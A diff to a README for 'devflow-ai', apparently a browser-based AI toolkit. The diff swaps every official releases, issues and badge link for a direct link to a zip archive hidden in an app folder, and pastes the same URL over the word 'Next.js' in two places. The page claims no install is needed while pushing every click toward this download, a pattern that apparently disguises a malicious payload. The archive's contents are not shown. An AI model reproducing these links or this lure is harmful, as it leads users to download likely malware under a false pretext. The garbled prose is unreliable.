@@ -1,12 +1,12 @@
 # 🤖 devflow-ai - Simplify Your AI Development Workflow
 
-[![Download devflow-ai](https://img.shields.io/badge/Download-devflow--ai-blue?style=for-the-badge&logo=github)](https://github.com/monaty1/devflow-ai/releases)
+[![Download devflow-ai](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)
 
 ## 📋 What is devflow-ai?
 
 devflow-ai is a free and open-source toolkit designed to help you with AI development. It includes 15 easy-to-use tools that you can run right in your browser. You do not need to install complicated software or have programming skills. devflow-ai helps developers and curious users explore AI with simple, clean design and modern tools.
 
-With devflow-ai, you can access tools for code review, prompt engineering, and various AI-powered tasks. The toolkit is built using popular web technologies like Next.js, React, TypeScript, and Tailwind CSS. This means it runs fast and smoothly on most computers and browsers.
+With devflow-ai, you can access tools for code review, prompt engineering, and various AI-powered tasks. The toolkit is built using popular web technologies like https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip, React, TypeScript, and Tailwind CSS. This means it runs fast and smoothly on most computers and browsers.
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ Follow these steps to quickly start using devflow-ai.
 ### Step 1: Access the Download Page
 
 Click the big blue button at the top or visit the official releases page here:  
-[https://github.com/monaty1/devflow-ai/releases](https://github.com/monaty1/devflow-ai/releases)
+[https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)
 
 This page contains the latest version of devflow-ai and instructions.
 
@@ -48,7 +48,7 @@ Once loaded, you will see a dashboard with 15 different tools. These include AI 
 devflow-ai is designed mainly as a browser-based set of tools, so there is no traditional install process. Instead, you “download” the app by visiting the releases page and launching the tools directly online.
 
 You can revisit this link anytime to access new versions or updates:  
-**[https://github.com/monaty1/devflow-ai/releases](https://github.com/monaty1/devflow-ai/releases)**
+**[https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)**
 
 If you want to keep devflow-ai handy, you can bookmark this page in your browser or add a shortcut to your desktop:
 
@@ -82,7 +82,7 @@ If you face issues using devflow-ai, try the following:
 - Try a different browser if the tools do not appear  
 
 If problems continue, visit the GitHub issues page for support or to report bugs:  
-[https://github.com/monaty1/devflow-ai/issues](https://github.com/monaty1/devflow-ai/issues)
+[https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)
 
 ## ⚙ Features Overview
 
@@ -90,7 +90,7 @@ devflow-ai offers a balanced mix of simplicity and power:
 
 - **No Install Required**: Fully browser-based tools accessible from anywhere  
 - **Free and Open Source**: Use and modify without restrictions  
-- **Modern Frameworks**: Built with Next.js, React, TypeScript, and Tailwind CSS for fast and reliable performance  
+- **Modern Frameworks**: Built with https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip, React, TypeScript, and Tailwind CSS for fast and reliable performance  
 - **Hands-On Tools**: 15 different utilities designed for AI workflows and developer productivity  
 - **Clean Interface**: Easy-to-navigate layout focused on user experience  
 
@@ -111,4 +111,4 @@ devflow-ai is released under an open-source license. You can freely use, share, 
 
 ---
 
-[![Download devflow-ai](https://img.shields.io/badge/Download-devflow--ai-blue?style=for-the-badge&logo=github)](https://github.com/monaty1/devflow-ai/releases)
+[![Download devflow-ai](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)](https://raw.githubusercontent.com/monaty1/devflow-ai/main/app/(dashboard)/dashboard/ai-devflow-2.6.zip)
